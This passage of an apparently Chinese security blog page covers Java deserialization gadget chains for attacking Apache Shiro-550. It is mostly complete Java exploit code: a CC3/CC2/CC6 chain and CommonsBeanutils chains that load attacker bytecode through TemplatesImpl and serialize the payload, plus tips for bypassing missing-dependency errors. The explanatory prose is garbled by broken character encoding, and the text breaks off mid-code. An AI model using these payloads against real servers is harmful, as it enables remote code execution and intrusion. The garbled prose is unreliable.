org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//CC3</span></span><br><span class="line">        TemplatesImpl templatesimpl=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class c=templatesimpl.getClass();</span><br><span class="line">        Field _nameField=c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templatesimpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field _byteCodesField=c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _byteCodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes= &#123;code&#125;;</span><br><span class="line">        _byteCodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC2</span></span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC6</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templatesimpl);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">        lazyMap.remove(templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹LazyMapç±»çš„factoryå±æ€§</span></span><br><span class="line">        Class clazz=LazyMap.class;</span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,invokerTransformer);</span><br><span class="line">        </span><br><span class="line">        serialize(hashMap2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppUXTsI"><img src="https://s1.ax1x.com/2023/03/21/ppUXTsI.png" alt="ppUXTsI.png"></a></p><h3 id="CommonsBeanutils1-8-3æ— ä¾èµ–é“¾"><a href="#CommonsBeanutils1-8-3æ— ä¾èµ–é“¾" class="headerlink" title="CommonsBeanutils1.8.3æ— ä¾èµ–é“¾"></a>CommonsBeanutils1.8.3æ— ä¾èµ–é“¾</h3><p>ä¸ºä»€ä¹ˆå«æ— ä¾èµ–é“¾ï¼Ÿå› ä¸ºshiro550ä¸­è‡ªå¸¦äº†<code>CommonsBeanutils1.8.3</code></p><h4 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>commons-beanutilsæ˜¯Apacheæä¾›çš„ä¸€ä¸ªç”¨äºæ“ä½œJAVA beançš„å·¥å…·åŒ…ã€‚é‡Œé¢æä¾›äº†å„ç§å„æ ·çš„å·¥å…·ç±»ï¼Œè®©æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„å¯¹beanå¯¹è±¡çš„å±æ€§è¿›è¡Œå„ç§æ“ä½œã€‚</p><h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>TestBean</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Tom&quot;</span>,<span class="number">15</span>);</span><br><span class="line">        <span class="comment">//ä¸ä½¿ç”¨commons-beanutils</span></span><br><span class="line">        System.out.println(person.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä½¿ç”¨commons-beanutils</span></span><br><span class="line">        System.out.println(PropertyUtils.getProperty(person, <span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppUX7Lt"><img src="https://s1.ax1x.com/2023/03/21/ppUX7Lt.png" alt="ppUX7Lt.png"></a></p><p>å¯ä»¥å‘ç°ï¼Œé€šè¿‡<code>commons-beanutils</code>å¯ä»¥å®ç°åŠ¨æ€è°ƒç”¨æ–¹æ³•ï¼Œå¸¦æ¥ä¾¿æ·çš„åŒæ—¶ä¹Ÿå¸¦æ¥äº†å®‰å…¨é—®é¢˜</p><h4 id="åˆ©ç”¨é“¾åˆ†æ-1"><a href="#åˆ©ç”¨é“¾åˆ†æ-1" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h4><p>ä¸‹ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼Œè·Ÿè¿›<code>getProperty()</code></p><p><a href="https://imgse.com/i/ppUXqdf"><img src="https://s1.ax1x.com/2023/03/21/ppUXqdf.png" alt="ppUXqdf.png"></a></p><p>å‘ç°åˆè°ƒç”¨äº†å¦ä¸€ä¸ª<code>getProperty()</code></p><p><a href="https://imgse.com/i/ppUXjJg"><img src="https://s1.ax1x.com/2023/03/21/ppUXjJg.png" alt="ppUXjJg.png"></a></p><p>è·Ÿè¿›<code>getNestedProperty()</code></p><p><a href="https://imgse.com/i/ppUXxzj"><img src="https://s1.ax1x.com/2023/03/21/ppUXxzj.png" alt="ppUXxzj.png"></a></p><p><code>getNestedProperty()</code>åœ¨è¿™é‡Œåšäº†ä¸€ä¸ªç±»ä¼¼swithçš„åˆ¤æ–­ï¼Œå¦‚æœæ˜¯mapçš„è¯å°±è°ƒmapï¼Œå¦‚æœæ˜¯ç´¢å¼•çš„è¯å°±è°ƒç´¢å¼•â€¦â€¦</p><p>å› ä¸ºæˆ‘ä»¬è¿™é‡Œå°±æ˜¯æœ€æ™®é€šçš„ä¸€ä¸ªbeanæ‰€ä»¥ï¼Œæœ€åä¼šè°ƒåˆ°<code>getSimpleProperty()</code></p><p>ç»§ç»­å¾€ä¸‹è·Ÿï¼Œçœ‹ä¸€ä¸‹<code>descriptor</code></p><p><a href="https://imgse.com/i/ppUziwt"><img src="https://s1.ax1x.com/2023/03/21/ppUziwt.png" alt="ppUziwt.png"></a></p><p>è¿”å›äº†setï¼Œgetæ–¹æ³•ï¼ŒåŒæ—¶å°†æˆ‘ä»¬ä¼ å…¥çš„beançš„é¦–å­—æ¯è¿›è¡Œäº†å¤§å†™</p><p>å‘ä¸‹è·Ÿ</p><p><a href="https://imgse.com/i/ppUztl4"><img src="https://s1.ax1x.com/2023/03/21/ppUztl4.png" alt="ppUztl4.png"></a></p><p>è¿™é‡Œå­˜åœ¨ä¸€ä¸ªåå°„è°ƒç”¨ï¼Œè°ƒç”¨æµç¨‹ä¹Ÿå¾ˆæ¸…æ™°ï¼Œå¯¹æˆ‘ä»¬ä¼ é€’çš„å¯¹è±¡ï¼Œæ¥è°ƒç”¨ç¬¦åˆjavabeanæ ¼å¼çš„æ–¹æ³•</p><p><a href="https://imgse.com/i/ppUzN6J"><img src="https://s1.ax1x.com/2023/03/21/ppUzN6J.png" alt="ppUzN6J.png"></a></p><p>åˆ©ç”¨ç‚¹ä¹Ÿåœ¨è¿™é‡Œ</p><p>åœ¨cc3ä¸­ï¼Œåˆ©ç”¨<code>TemplatesImpl.getOutputProperties()</code>ä¸‹çš„<code>newTransformer()</code>å®ç°äº†åŠ¨æ€ç±»çš„åŠ è½½</p><p>åœ¨cbé“¾ä¸­ï¼Œ<code>getOutputProperties()</code>å¯ä»¥çœ‹ä½œä¸€ä¸ªç¬¦åˆJavaBeanè§„èŒƒçš„æ–¹æ³•</p><p>æ‰€ä»¥ï¼Œåœ¨cbä¸­ï¼Œåªéœ€å¯¹TemplatesImplå¯¹è±¡è°ƒç”¨getOutputProperties()æ–¹æ³•å°±å¯ä»¥å®ç°åŠ¨æ€ç±»çš„åŠ è½½</p><p><strong>demo1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        PropertyUtils.getProperty(templates, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppUzUX9"><img src="https://s1.ax1x.com/2023/03/21/ppUzUX9.png" alt="ppUzUX9.png"></a></p><p>ç°åœ¨åªéœ€è¦æ‰¾åˆ°è°ƒç”¨<code>getProperty()</code>çš„åœ°æ–¹å°±è¡Œäº†</p><p><code>BeanComparator.compare()</code>,å…¶ä¸­çš„propertyå±æ€§æ˜¯å¯æ§çš„ï¼Œo1,o2æ˜¯ä¼ å…¥çš„å‚æ•°</p><p><a href="https://imgse.com/i/ppUzdmR"><img src="https://s1.ax1x.com/2023/03/21/ppUzdmR.png" alt="ppUzdmR.png"></a></p><h5 id="ç®€å•æ— ä¾èµ–"><a href="#ç®€å•æ— ä¾èµ–" class="headerlink" title="ç®€å•æ— ä¾èµ–"></a>ç®€å•æ— ä¾èµ–</h5><p>ç»§ç»­å‘ä¸Šæ‰¾è°ƒç”¨compareçš„åœ°æ–¹ï¼Œåœ¨cc2ä¸­å¯ä»¥ç”¨ä¼˜å…ˆé˜Ÿåˆ—æ¥æ‰¾åˆ°compareï¼Œæ‰€ä»¥è‡³æ­¤ï¼Œåˆ©ç”¨é“¾æ„é€ å®Œæ¯•</p><p><strong>Gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">BeanComparator.compare()</span><br><span class="line">PropertyUtils.getProperty()</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">defineClass-&gt;newInstance()</span><br></pre></td></tr></table></figure><p><strong>demo2</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC3</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CB</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC2</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;PriorityQueue&gt; c2 = PriorityQueue.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„å‡ ä¸ªç‚¹ï¼Œåœ¨æ„é€ çš„payloadä¸­æˆ‘ä»¬åˆ©ç”¨äº†<code>TransformingComparator</code>ç±»ï¼Œå¯æ˜¯<code>TransformingComparator</code>ç±»ä¸æ˜¯<code>CommonsColections4</code>ä¸­çš„ç±»å—ï¼ŸShiroä¸­æ˜¯ä¸å¸¦æœ‰cc4ä¾èµ–çš„</p><p>å…¶å®è¿™å°±æ¶‰åŠåˆ°äº†æ„é€ Expæ—¶çš„ä¸€ä¸ªæŠ€å·§ï¼Œåªè¦ä¿è¯åºåˆ—åŒ–æ—¶çš„ç±»æ˜¯ç¯å¢ƒä¸­å­˜åœ¨çš„ï¼Œä¹‹å‰æ€æ ·è°ƒç”¨éƒ½æ˜¯å¯ä»¥çš„</p><p>åœ¨Expé‡Œåé¢éƒ¨åˆ†é€šè¿‡åå°„ä¿®æ”¹äº†<code>PriorityQueue</code>ç±»çš„å€¼ä¸º<code>BeanComparator</code>ç±»ï¼Œæ‰€ä»¥åœ¨è¿›è¡Œåºåˆ—åŒ–æ—¶æ˜¯ä¸åŒ…å«<code>TransformingComparator</code>ç±»çš„</p><p>AESåŠ å¯†åæ‰§è¡Œï¼Œåˆå‡ºç°äº†æŠ¥é”™</p><p><a href="https://imgse.com/i/ppUzw01"><img src="https://s1.ax1x.com/2023/03/21/ppUzw01.png" alt="ppUzw01.png"></a></p><p>æ‰¾ä¸åˆ°<code>org.apache.commons.collections.comparators.ComparableComparator</code>ç±»</p><p>è¿™ä¸ªç±»ä¸æ˜¯cc3.2.1ä¸­çš„ç±»å—ï¼Œæˆ‘ä»¬åºåˆ—åŒ–çš„payloadä¸­æ˜¯ä¸åŒ…å«cc3.2.1ä¸­çš„ç±»çš„</p><p>å®é™…ä¸Šï¼Œé—®é¢˜å‡ºåœ¨<code>BeanComparator</code>,æ„é€ é“¾ä¸­æ‰€è°ƒç”¨çš„<code>BeanComparator</code>çš„æœ‰å‚æ„é€ ï¼Œè€Œå…¶æœ‰å‚æ„é€ å‡½æ•°é‡Œè°ƒç”¨äº†ComparableComparator</p><p><a href="https://imgse.com/i/ppUz0Tx"><img src="https://s1.ax1x.com/2023/03/21/ppUz0Tx.png" alt="ppUz0Tx.png"></a></p><p>è€ŒComparableComparatoræ˜¯cc3.2.1ä¸­çš„ï¼Œè§£å†³æ–¹æ³•ä¹Ÿéå¸¸ç®€å•ï¼Œè°ƒç”¨<code>BeanComparator</code>ç±»çš„å¦ä¸€ä¸ªæœ‰å‚å‡½æ•°ï¼Œè¯¥æ„é€ å‡½æ•°å…è®¸è‡ªå·±ä¼ å…¥ä¸€ä¸ªcomparatorï¼Œé‚£ä¼ å…¥ä¸€ä¸ªcbæˆ–è€…jdké‡Œé¢æœ‰çš„comparatorå°±è¡Œäº†</p><p><a href="https://imgse.com/i/ppUzDk6"><img src="https://s1.ax1x.com/2023/03/21/ppUzDk6.png" alt="ppUzDk6.png"></a></p><p>æ‰¾è¿™ä¸ªcomparatorä¹Ÿæ˜¯ååˆ†å¥½æ‰¾çš„ï¼Œå› ä¸ºè¦è¿›è¡Œååºåˆ—åŒ–ï¼Œæ‰€ä»¥è¦æ‰¾ä¸€ä¸ªç»§æ‰¿serializeæ¥å£çš„ï¼ŒåŒæ—¶ç»§æ‰¿Comparatoræ¥å£çš„ã€‚</p><p>æœ‰å¾ˆå¤šè¿™æ ·çš„comparatorï¼Œè¿™é‡Œå°±ç”¨<code>AttrCompare.compare()</code>å°±è¡Œäº†</p><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC3</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span 